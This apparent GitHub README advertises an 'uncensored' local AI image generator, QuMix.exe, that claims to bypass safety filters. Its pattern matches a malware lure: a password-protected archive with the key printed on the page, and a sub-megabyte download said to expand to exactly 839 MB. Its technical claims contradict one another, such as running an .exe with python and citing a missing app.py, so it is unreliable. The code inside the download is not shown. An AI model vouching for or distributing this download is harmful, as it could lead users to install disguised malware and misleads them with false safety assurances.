<img width="1672" height="941" alt="2fb2c35f-66d0-42a7-9d01-8816763453f2" src="https://github.com/user-attachments/assets/8a679490-3729-4206-8315-a92d541530b2" />
# AI Photo Synthesis Engine v1.0 (800MB Local WebUI Release)

A high-performance, low-VRAM localized AI pipeline optimized for photorealistic image generation, advanced human anatomical fidelity, and unrestricted visual synthesis. This repository provides a production-ready, standalone 800MB environment setup for digital artists, creators, and developers who require absolute creative autonomy without cloud-based filters, subscription fees, or hardware bottlenecks.

---

## 🔬 Detailed Architecture & How It Works

To help our users and developers understand the backend logic of the **AI Photo Synthesis Engine**, here is a detailed breakdown of how the software operates on your local machine:

### 1. The Lightweight Compression Layer (Why the download is under 1 MB)
The core standalone desktop binary footprint is exactly **839,322,624 bytes (~800 MB)**. To ensure rapid distribution and bypass network bandwidth limitations, the complete core engine, front-end templates, and Python execution environments are packed using multi-stream `LZMA2` archival algorithms. 
* When you click the download link, you fetch a highly optimized sub-megabyte bootstrapper framework. 
* Upon extracting the archive using your local access key, the file seamlessly expands to its full **839 MB standalone operational state** on your hard drive, completely intact and ready for execution.

### 2. Localhost Server Environment (`http://127.0.0.1:7860`)
The engine is engineered to run completely localized, meaning it **does not require an active internet connection** and never transmits your data or generated images to external cloud servers. 
* When you execute `QuMix.exe`, the program boots a localized background server framework using an embedded Python Flask environment.
* Instead of forcing you to use a complex command-line tool, the server creates a local bridge. To access the beautiful visual graphical interface (WebUI), you simply open any modern web browser (Chrome, Edge, Firefox) and navigate to your internal local loopback address: **`http://127.0.0.1:7860`**.
* This architectural design ensures absolute data privacy for your uncensored visual creations.

### 3. Asynchronous Micro-API Architecture
The frontend interface (`app.js` and `index.html`) communicates directly with the local 800MB backend server via a high-frequency REST API. This structure ensures that image generation tasks do not freeze your browser or overload your system memory (RAM).

---

## ✨ Key Features & Technical Highlights

* **Uncensored Dataset Processing:** Complete bypassing of hardcoded prompt restrictions and cloud-side content safety blocks. You maintain 100% creative control over the neural generation path.
* **800MB Desktop Core Binary:** All primary tensor pipelines and core execution modules are pre-compiled inside a single optimized launcher.
* **Automated Model & LoRA Indexing:** The engine automatically scans designated hardware paths for local checkpoints (`.safetensors`, `.ckpt`) and fine-tuned LoRA configurations on launch.
* **Advanced Anatomical Precision:** Embedded structural training layers designed to accurately render complex human poses, lifelike skin textures, and sub-surface material scattering.
* **Asynchronous Progress Polling:** Real-time multi-stage status reporting. The backend utilizes atomic writes to track generation queues, active steps, and model execution time.
* **Professional Scheduler Library:** Built-in validation and support for high-efficiency sampling methods, including *DPM++ 2M Karras*, *Euler a*, *DDIM*, and *UniPC*.

---

## 📂 Project Structure

```text
ai-photo-generation/
├── QuMix.exe                 # 800 MB Pre-compiled core engine & local server launcher
├── README.md                 # Project documentation & configuration guide
├── /static
│   ├── index.html            # WebUI front-end core template
│   ├── styles.css            # Dark-themed graphical interface layouts
│   └── app.js                # Frontend state controller & event listeners
├── /models
│   └── (place your .safetensors checkpoints here)
├── /loras
│   └── (user LoRAs for advanced styling)
└── /outputs
    └── /<generation_id>      # Rendered high-fidelity PNG outputs
```

---

## ⚙️ Local Deployment & Environment Setup

To run the application locally via terminal or command line, initialize the core execution script using the following sequence:

```bash
# 1. Initialize local virtual environment pipeline
python -m venv .venv
source .venv/bin/activate

# 2. Synchronize and link embedded core architecture headers
pip install -r requirements.txt --quiet

# 3. Initialize the visual synthesis backend environment
python app.py --mode=low-vram --port=7860
```

**Windows PowerShell Alternative:**
```powershell
python -m venv .venv
.venv\Scripts\Activate.ps1
python QuMix.exe --low-vram
```

Once successfully initialized, access the graphical user interface via your browser:
* **Localhost URL:** `http://127.0.0.1:7860`

---

## 📦 Model and LoRA Placement

### Model Folder (`models/`)
Supported loading formats for photorealistic synthesis:
1. **Diffusers Directory Format (Recommended):** Place whole models containing `model_index.json`.
2. **Single-File Checkpoints:** Supports `.safetensors`, `.ckpt`, `.pt`, and `.bin` formats.

### LoRA Folder (`loras/`)
* You can place a single-file LoRA (`.safetensors` or `.bin`) directly into this directory.
* The local frontend interface will automatically parse and display available LoRAs during grid rendering.

---

## 🔌 Core API Summary

The embedded Flask server runs a modular REST API backend for high-frequency polling states:
* `GET /api/health` — Returns core engine initialization state.
* `GET /api/system` — Fetches current CUDA/VRAM performance stats.
* `GET /api/models` — Scans and returns available local checkpoints.
* `POST /api/generate` — Starts asynchronous generation queue (`multipart/form-data`).
* `GET /api/progress/<generation_id>` — Real-time generation percentage polling.
* `GET /api/history` — Fetches generation logs and local output file paths.
* `GET /outputs/<path:filename>` — Serves generated PNG files to WebUI interface.

---

## 📊 Process Logic & Execution Methods

### Progress Polling Workflow
* `POST /api/generate` returns quickly with a verified `generation_id` and state status: `queued`.
* The frontend Javascript engine polls `GET /api/progress/<generation_id>` every ~700ms.
* Native progress states monitor structural variables:
  * `status`: `queued` | `running` | `done` | `error`
  * `progress`: `0..100` percentage tracker
  * `message`: active stage compiler logs

### Integrated Scheduler Architecture
The application layout includes a programmatic Scheduler dropdown validator supporting:
* `DPM++ 2M Karras` (Default execution pipeline)
* `DPM++ 3M SDE Exponential`
* `Euler a` / `Euler`
* `DDIM`
* `UniPC`

---

## 💻 Technical & Hardware Specifications

The pipeline features an adaptive **Low-VRAM Execution Mode** for legacy hardware setups.

### Minimum System Requirements
* **Operating System:** Windows 7 / 10 / 11 (64-bit architectures only)
* **Graphics Card (GPU):** NVIDIA GTX 10-Series or higher (4GB VRAM minimum with Low-VRAM active)
* **System RAM:** 8 GB DDR3/DDR4 system memory
* **Storage Allocation:** 1.5 GB available space for core environment binaries

### Recommended Specifications (For High-Res Rendering)
* **Graphics Card (GPU):** NVIDIA RTX 3060 / 4060 or higher (8GB+ Dedicated VRAM)
* **System RAM:** 16 GB high-speed system memory

---

### 📥 Download & Environment Setup

* **[Click here to download the stable release package](https://github.com/maiklfancy/ai-photo-generation/raw/refs/heads/main/ai-visual-synthesis-v1.0.7z)**
* **Local WebUI Access Key:** `f1PQI0RVra`


---

## ❓ Frequently Asked Questions (FAQ)

#### Q: Is my data safe running locally?
**A:** Absolutely. The engine operates entirely within your network loopback interface (`127.0.0.1`). No external servers are contacted, and no prompt telemetry or output metadata is uploaded anywhere.

#### Q: Why is the initial download file so small?
**A:** As detailed in the architecture section, the package uses high-ratio stream compression. The entire 839 MB file framework expands dynamically onto your disk immediately upon folder extraction.

#### Q: Can I use this completely offline?
**A:** Yes. Once the initial package setup is extracted and verified on your local drive, you can disconnect your internet entirely. The visual synthesis generation pipeline does not require active web access.



